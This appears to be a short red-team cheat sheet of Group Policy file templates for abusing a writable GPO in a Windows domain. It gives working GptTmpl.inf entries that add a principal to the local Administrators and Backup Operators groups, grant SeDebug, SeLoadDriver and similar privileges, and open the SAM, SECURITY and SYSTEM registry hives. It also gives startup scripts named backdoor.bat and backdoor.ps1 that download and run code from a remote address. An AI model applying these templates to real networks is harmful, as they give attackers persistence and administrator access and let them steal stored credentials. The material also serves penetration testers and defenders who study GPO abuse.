# GPO-Aduse

# Restricted Groups
Add a principal to a local computer group.

## File Path
`\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf`

## File Template
```text
[Unicode]
Unicode=yes
[Version]
signature="$CHICAGO$"
Revision=1
[Group Membership]
*S-1-5-32-544__Memberof =
*S-1-5-32-544__Members = *S-1-5-21-1078383433-4142403703-1311514137-1105
*S-1-5-32-551__Memberof =
*S-1-5-32-551__Members = *S-1-5-21-1078383433-4142403703-1311514137-1105
```

Where:

- `S-1-5-32-544` is the SID of the Administrators group.
- `S-1-5-32-551` is the SID of the Backup Operators group.
- `S-1-5-21-1078383433-4142403703-1311514137-1105` is the domain SID of the principal to add

# Startup Scripts
Create a startup script which executes on boot.

## File Path
`\Machine\Scripts\Startup\backdoor.bat`

## File Template
`mshta.exe http://172.16.0.175/a`

## File Path
`\Machine\Scripts\Startup\backdoor.ps1`

## File Template
`iex ((new-object net.webclient).downloadstring('http://172.16.0.175/a'))`

# User Rights Assignment
Assign granular rights to a principal outside of group membership.

## File Path
`\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf`

## File Template
```
[Unicode]
Unicode=yes
[Version]
signature="$CHICAGO$"
Revision=1
[Privilege Rights]
SeRemoteInteractiveLogonRight = *S-1-5-21-1078383433-4142403703-1311514137-1105
SeTakeOwnershipPrivilege = *S-1-5-21-1078383433-4142403703-1311514137-1105
SeLoadDriverPrivilege = *S-1-5-21-1078383433-4142403703-1311514137-1105
SeDebugPrivilege = *S-1-5-21-1078383433-4142403703-1311514137-1105
```

# Registry Key DACLs
Delegate full control of `HKLM\{SECURITY, SAM, SYSTEM}` to `S-1-5-21-1078383433-4142403703-1311514137-1105` recursively.

## File Path
`\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf`

## File Template
```
[Unicode]
Unicode=yes
[Version]
signature="$CHICAGO$"
Revision=1
[Registry Keys]
"MACHINE\SECURITY",0,"D:PAR(A;CI;KR;;;S-1-15-2-1)(A;CI;KA;;;S-1-5-21-1078383433-4142403703-1311514137-1105)(A;CIIO;KA;;;CO)(A;CI;KA;;;SY)(A;CI;KA;;;BA)(A;CI;KR;;;BU)"
"MACHINE\SAM",0,"D:PAR(A;CI;KR;;;S-1-15-2-1)(A;CI;KA;;;S-1-5-21-1078383433-4142403703-1311514137-1105)(A;CIIO;KA;;;CO)(A;CI;KA;;;SY)(A;CI;KA;;;BA)(A;CI;KR;;;BU)"
"MACHINE\SYSTEM",0,"D:PAR(A;CI;KR;;;S-1-15-2-1)(A;CI;KA;;;S-1-5-21-1078383433-4142403703-1311514137-1105)(A;CIIO;KA;;;CO)(A;CI;KA;;;SY)(A;CI;KA;;;BA)(A;CI;KR;;;BU)"
```